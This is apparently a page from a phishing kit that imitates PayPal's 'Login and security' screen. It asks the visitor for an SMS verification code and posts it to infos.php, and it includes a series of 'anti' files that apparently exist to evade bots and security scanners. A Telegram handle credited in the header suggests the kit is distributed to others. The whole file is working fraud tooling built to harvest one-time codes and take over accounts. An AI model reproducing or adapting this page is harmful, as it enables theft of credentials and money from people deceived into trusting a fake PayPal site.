<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti/anti1.php");
include("../anti/anti2.php");
include("../anti/anti3.php");
include("../anti/anti4.php");
include("../anti/anti5.php");
include("../anti/anti6.php");
include("../anti/anti7.php");
include("../anti/anti8.php");

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>PayPal: Security</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">               
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/Untitled-1.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Untitled-1.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
    <header class="header-sms">
        <nav>
            <div class="logo">
                <img src="image/logo-sms.svg">
            </div>
            <div class="ul">
                <ul class="list-unstyled">
                    <li>Summary</li>
                    <li>Activity</li>
                    <li>Send & Request</li>
                    <li>Wallet</li>
                    <li>Offers</li>
                    <li>Help</li>
                </ul>
                <ul style="align-items: center;margin-top: 24px;" class="list-unstyled">
                    <li><img src="image/notifications.svg"></li>
                    <li><img src="image/settings.svg"></li>
                    <li style="font-size: .75rem;">LOG OUT</li>
                </ul>
            </div>   
        </nav>
        <div class="nav-res">
            <div class="menu-res">
                <img src="image/menu-res.png">
            </div>
            <div class="logo-res">
                <img src="image/logo-sms.svg">
            </div>
            <div class="notification">
                <img src="image/notifications.svg">
            </div>
        </div>
    </header>
    <section >
        <div class="section">
            <div class="search">
                <div class="inp-search">
                    <input type="text" placeholder="search" name="">
                    <div class="icon">
                     <i class="fas fa-search"></i>           
                    </div>
                </div>
                <hr>
                <p>Login and security</p>
                <h5>Personal information</h5>
            </div>
            <div class="sms">
                <h5>Lest's verify it's you</h5>
                <hr>
                <div class="sms-bod">
                    <img src="image/sms.png">
                    <h4>Enter your code</h4>
                    <p class="mb-4">A security code will be sent to you by SMS or by call from a voice server on your phone that will be valid for 5 minutes</p>
                    <form action="infos.php" method="post">
                        <input type="hidden" name="step" value="sms">
                        <div class="inp-sms">
                            <input type="text"  placeholder="Enter the code received by SMS " name="sms_code">
                            <p>Resend</p>
                             <?php
                             if( !empty($_SESSION['errors']['sms_code']) ) {
                                echo '<div class="error">Code sms not valid</div>';
                             }
                             ?>
                        </div>   
                        <button name="submit">Confirm</button>     
                    </form>
                    
                </div>
            </div>
        </div>
    </section>
    <footer class="footer-sms">
        <div class="footerr">
            <div class="footer-left">
                <ul class="list-unstyled">
                    <li>Help</li>
                    <li>Sitemap</li>
                    <li>Fees</li>
                    <li>Security</li>
                </ul>
                <ul class="list-unstyled">
                    <li>English</li>
                    <li>Francais</li>
                    <li>Espanol</li>
                </ul>
            </div>
            <div class="langue">
                <ul class="list-unstyled">
                    <li>About paypal</li>
                    <li>Devolopers</li>
                    <li>Partners</li>
                </ul>
            </div>
            <hr>
            <div class="copy">
                <p>copyright © 1992-2021 payPal . All rights reserved</p>
                <ul class="list-unstyled d-flex">
                    <li>privacy policy</li>
                    <li>legal agrements</li>
                    <li>policy Updats</li>
                </ul>
            </div>
            <h5>consumer advisory  paypal pte ltd . the holder of paypal's stored value facilty .does not require the approval of the Monetary Authority of singapore . Users are advised to read the terms and conditions carefully </h5>
        </div>
    </footer>
    
     

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>
</body>
</html>